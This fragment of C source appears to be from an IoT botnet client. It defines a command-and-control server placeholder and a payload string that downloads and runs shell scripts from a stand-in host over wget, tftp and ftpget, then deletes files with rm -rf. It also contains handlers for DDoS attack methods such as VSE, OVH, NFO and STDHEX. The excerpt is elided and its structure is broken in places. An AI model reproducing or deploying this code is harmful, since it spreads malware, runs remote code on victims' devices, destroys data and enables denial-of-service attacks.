...
unsigned char *commServer[] = {"SERVER IP:PORT"};
char *payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://SERVER-IP-HERE/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp SERVER-IP-HERE -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g SERVER-IP-HERE; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 SERVER-IP-HERE ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf bins.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *";
...
if(!strcmp(argv[0], "VSE")) {
        ...
        if(strstr(ip, ",") != NULL)
        {
			...
			if(!strcmp(argv[0], "100UP") || !strcmp(argv[0], "OVH") || !strcmp(argv[0], "EWDWEED"))
    {
        ...
        exit(0);
            ...
            if(!strcmp(argv[0], "NFO") || !strcmp(argv[0], "STDHEX") || !strcmp(argv[0], "EFJIFJJF"))
    {
        if(argc < 4 || atoi(argv[2]) < 1 || atoi(argv[3]) < 1)
        {
            return;
